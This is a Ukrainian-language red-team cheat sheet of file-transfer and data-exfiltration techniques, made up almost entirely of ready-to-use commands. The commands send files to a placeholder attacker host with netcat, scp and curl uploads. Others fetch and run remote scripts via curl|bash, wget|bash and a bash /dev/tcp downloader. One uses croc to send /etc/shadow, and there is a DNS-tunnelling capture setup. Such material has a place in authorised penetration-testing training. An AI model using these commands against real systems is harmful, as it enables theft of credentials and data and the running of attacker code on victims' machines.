
# 🛡️ Exfiltration & Transfer Cheat Sheet (Red Team Edition)

Цей файл містить практичні техніки для ексфільтрації та передачі файлів у Red Team-операціях в умовах обмежених середовищ. Організовано по категоріях із реальними прикладами команд.

---

## 📦 1. Використання Netcat (nc)

### 🔸 Передача файлу з таргета на хост атакуючого:

**На атакуючій машині (отримує файл):**
```bash
nc -lvnp 9000 > received_file
```

**На таргеті (відправляє файл):**
```bash
nc <attacker_ip> 9000 < /path/to/file
```

---

## 📦 2. Завантаження бінарників (Netcat, Nmap, тощо)

### 🔸 Скачування готових утиліт:

**GitHub-репозиторії:**
- https://github.com/andrew-d/static-binaries
- https://github.com/Xhoenix/static-bins
- https://github.com/ernw/static-toolbox

### 🔸 На атакуючій машині (передача утиліти):
```bash
nc -lvnp 9001 < ./ncat
```

### 🔸 На таргеті:
```bash
nc <attacker_ip> 9001 > /tmp/ncat
chmod +x /tmp/ncat
```

---

## 🌐 3. Використання `curl` / `wget`

### 🔸 Завантаження через `curl`:
```bash
curl http://<attacker_ip>/payload.sh --output payload.sh
chmod +x payload.sh
./payload.sh
```

### 🔸 Через `wget`:
```bash
wget http://<attacker_ip>/payload.sh -O payload.sh
chmod +x payload.sh
```

---

## 🛠️ 4. Якщо немає curl/wget — використання Bash TCP (`/dev/tcp`)

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

**Використання:**
```bash
__wget http://<attacker_ip>/file.sh | bash
```

---

## 🔒 5. Передача через `scp`

### 🔸 З таргета на VPS (атакуючий хост):
```bash
scp /path/file.txt user@attacker_ip:/tmp/file.txt
```

### 🔸 З VPS на таргет:
```bash
scp /tmp/file.txt user@target_ip:/path/file.txt
```

---

## 🧪 6. Виконання скрипта без збереження

```bash
curl http://<attacker_ip>/script.sh | bash
```

або через `wget`:
```bash
wget -qO- http://<attacker_ip>/script.sh | bash
```

---

## 🧬 7. Передача через base64 (у сильно обмеженому середовищі)

**На своїй машині:**
```bash
base64 -w0 payload.sh > payload.b64
```

**На таргеті (вручну):**
```bash
echo "base64_encoded_data_here" > file.txt
base64 -d file.txt > result.sh
chmod +x result.sh
```

---

## 🚀 8. Використання `croc`

### 🔸 Встановлення:
```bash
curl https://getcroc.schollz.com | bash
```

### 🔸 Передача:
```bash
croc send /etc/shadow
```

### 🔸 Прийом:
```bash
croc <code>
```

---

## 📡 9. Ексфільтрація через DNS + tcpdump

### 🔸 На сервері (перехоплення):
```bash
tcpdump -i any port 53 -w exfil.pcap
```

### 🔸 На таргеті:
```python
# Python script to send DNS queries with encoded data
```

### 🔸 Аналіз:
```bash
tshark -r exfil.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
```

---

## 🌃 9. Ексфільтрація через uploadserver

### 🔸 На сервері (перехоплення):
```bash
pip install uploadserver & python3 -m uploadserver
```

### 🔸 На таргеті:
```bash
curl -F "files=@/etc/hostname" http://<attacker_ip>:<port>/upload
```

---
